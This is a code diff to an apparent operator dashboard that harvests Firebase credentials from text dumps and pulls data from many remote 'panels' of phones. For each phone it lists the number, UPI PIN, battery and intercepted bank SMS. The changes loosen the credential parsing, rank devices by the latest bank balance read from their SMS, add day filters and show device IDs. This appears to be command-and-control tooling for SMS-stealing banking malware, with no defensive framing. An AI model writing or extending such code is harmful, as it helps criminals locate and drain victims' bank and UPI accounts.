@@ -880,24 +880,30 @@ async function firebaseGet(baseUrl, key, path, extra = {}, ms = 8000, parentSign
 
 function parseTxtCredentials(content) {
   const map = new Map();
-  let url = null, key = null;
-  const flush = () => {
-    if (url) {
-      const k = url.toLowerCase();
-      const ex = map.get(k);
-      if (!ex || (key && !ex.key)) map.set(k, { url, key: key || ex?.key || '', name: panelName(url) });
+  const lines = content.split(/\r?\n/);
+  for (let i = 0; i < lines.length; i++) {
+    let t = lines[i].trim();
+  if (!t || t.startsWith('#')) continue;
+    const urlMatch = t.match(/(https:\/\/[^\s,'"<>]+(?:firebaseio\.com|firebasedatabase\.app)[^\s,'"<>]*)/i);
+    if (!urlMatch) continue;
+    const url = urlMatch[1].replace(/[",\]\)]+$/, '').replace(/\/$/, '');
+    let key = null;
+    const keyOnLine = t.match(/(?:auth\s*key|secret|🔑|key)\s*[:=]\s*['"]?([A-Za-z0-9_\-./+=]+)/i);
+    if (keyOnLine) key = keyOnLine[1];
+    if (!key) {
+      for (let j = i + 1; j < Math.min(i + 4, lines.length); j++) {
+        const n = lines[j].trim();
+        if (/https:\/\//i.test(n)) break;
+        const km = n.match(/(?:auth\s*key|secret|🔑|key)\s*[:=]\s*['"]?([A-Za-z0-9_\-./+=]+)/i);
+        if (km) { key = km[1]; break; }
+        if (/^[A-Za-z0-9_\-./+=]{12,}$/.test(n) && !n.includes('firebase')) { key = n; break; }
+      }
     }
-    url = null; key = null;
-  };
-  for (const line of content.split('\n')) {
-    const t = line.trim();
-    const um = t.match(/(https:\/\/[^\s\n]+(?:firebaseio\.com|firebasedatabase\.app)[^\s\n]*)/);
-    if (/Firebase URL|📍|^URL:|Firebase:-/i.test(t) && um) { flush(); url = um[1].replace(/[-,]+$/, ''); }
-    if (/Auth Key|🔑|^KEY:/i.test(t)) { const v = t.split(':').slice(1).join(':').trim(); if (v) key = v; }
-    if (/New Firebase Credentials|Panda Group/i.test(t)) flush();
+    if (!key) continue;
+    const k = url.toLowerCase();
+    if (!map.has(k)) map.set(k, { url, key, name: panelName(url) });
   }
-  flush();
-  return [...map.values()].filter(p => p.key);
+  return [...map.values()];
 }
 
 function panelName(url) {
@@ -1084,7 +1090,18 @@ function reapplyTierToLoaded() {
 }
 
 function getDeviceSortAmount(d) {
+  if (globalSmsDays > 0 && d.smsLoaded && d.bankSms?.length) {
+    const bal = getLatestBalanceInDays(d.bankSms, globalSmsDays);
+    if (bal > 0) return bal;
+  }
   return d.sortAmount || d.maxBalance || d.maxTxn || 0;
+}
+
+function countBankSmsForDays(d) {
+  if (!d.smsLoaded) return 0;
+  const list = d.bankSms || [];
+  if (!globalSmsDays) return d.bankSmsCount || list.length;
+  return filterSmsByDays(list, globalSmsDays).length;
 }
 
 function isMediumAmount(n) {
@@ -1632,7 +1649,7 @@ async function fetchAllPanels(silent = false) {
   bulkSmsFetch = smsRunning || smsQueue.length > 0;
   btn.disabled = false;
   btn.innerHTML = '⚡ Fetch Live';
-  setStatus(`✅ ${allDevices.length} devices loaded · Filter + Sort select → ▶ Start Fetch`, 'ok');
+  setStatus(`✅ ${panels.length} panels · ${allDevices.length} devices · Filter + SMS days → ▶ Start Phase Fetch`, 'ok');
   updateFilterBar();
   updateFetchControlBtns();
   if (!isFetchWorkPending()) {
@@ -1713,11 +1730,12 @@ function renderDeviceRow(d, rank) {
   const balStr = d.maxBalance ? fmtBal(d.maxBalance) : '';
   const starOn = starred.has(d.id) ? ' on' : '';
   const pinBadge = d.upipin ? '<span class="badge-pin">PIN</span>' : '';
-  const smsHtml = d.bankSmsCount
-    ? `<div data-field="sms"><span class="lbl">Bank SMS : </span><span class="val">${d.bankSmsCount}${d.totalRawSms ? ' / ' + d.totalRawSms : ''}</span></div>`
-    : (!d.smsLoaded
-      ? '<div data-field="sms"><span class="lbl">Bank SMS : </span><span class="val sms-loading">Fetching...</span></div>'
-      : '');
+  const dayCount = countBankSmsForDays(d);
+  const smsHtml = d.smsLoaded
+    ? (dayCount
+      ? `<div data-field="sms"><span class="lbl">Bank SMS (${getSmsDaysLabel()}) : </span><span class="val">${dayCount}</span></div>`
+      : `<div data-field="sms"><span class="lbl">Bank SMS : </span><span class="val">0 · spam filtered</span></div>`)
+    : `<div data-field="sms"><span class="lbl">Bank SMS : </span><span class="val sms-loading">Fetching...</span></div>`;
   return `
   <div class="drow ${d.status ? 'is-online' : 'is-offline'}" data-idx="${d._idx}" data-device-id="${esc(d.id)}">
     <div class="drow-left">
@@ -1730,6 +1748,7 @@ function renderDeviceRow(d, rank) {
         ${pinBadge}
         ${balStr ? `<span class="badge-bal">${balStr}</span>` : ''}
       </div>
+      <div><span class="lbl">Device ID : </span><span class="val" style="font-size:0.72rem;word-break:break-all">${esc(d.id)}</span></div>
       <div><span class="lbl">Phone : </span><span class="val ${phoneCls}">${esc(phone)}</span></div>
       <div><span class="lbl">UPI Pin : </span><span class="val">${esc(pin)}</span></div>
       <div><span class="lbl">Battery : </span><span class="val">${esc(battery)}</span></div>
@@ -1779,8 +1798,9 @@ function patchDeviceRow(device) {
   const body = row.querySelector('.drow-body');
   const dateLine = body ? [...body.children].find(el => el.textContent.includes('Date :')) : null;
 
-  if (device.bankSmsCount) {
-    const smsTxt = `${device.bankSmsCount}${device.totalRawSms ? ' / ' + device.totalRawSms : ''}`;
+  const dayCount = countBankSmsForDays(device);
+  if (device.smsLoaded && dayCount) {
+    const smsTxt = `${dayCount} · ${getSmsDaysLabel()}`;
     if (!smsLine && body) {
       const div = document.createElement('div');
       div.dataset.field = 'sms';
@@ -1795,7 +1815,17 @@ function patchDeviceRow(device) {
       }
     }
   } else if (device.smsLoaded) {
-    if (smsLine) smsLine.remove();
+    const smsTxt = '0 · ' + getSmsDaysLabel();
+    if (!smsLine && body) {
+      const div = document.createElement('div');
+      div.dataset.field = 'sms';
+      div.innerHTML = `<span class="lbl">Bank SMS : </span><span class="val">${smsTxt}</span>`;
+      if (dateLine) body.insertBefore(div, dateLine);
+      else body.appendChild(div);
+    } else if (smsLine) {
+      const val = smsLine.querySelector('.val');
+      if (val) { val.textContent = smsTxt; val.classList.remove('sms-loading'); }
+    }
   } else if (smsLine) {
     const val = smsLine.querySelector('.val');
     if (val) {
@@ -2176,6 +2206,7 @@ document.querySelectorAll('[data-days]').forEach(b => b.addEventListener('click'
   globalSmsDays = Number(b.dataset.days);
   modalDays = globalSmsDays;
   syncDayPills();
+  reapplyTierToLoaded();
   updateFilterBar();
   lastRenderSig = '';
   render();
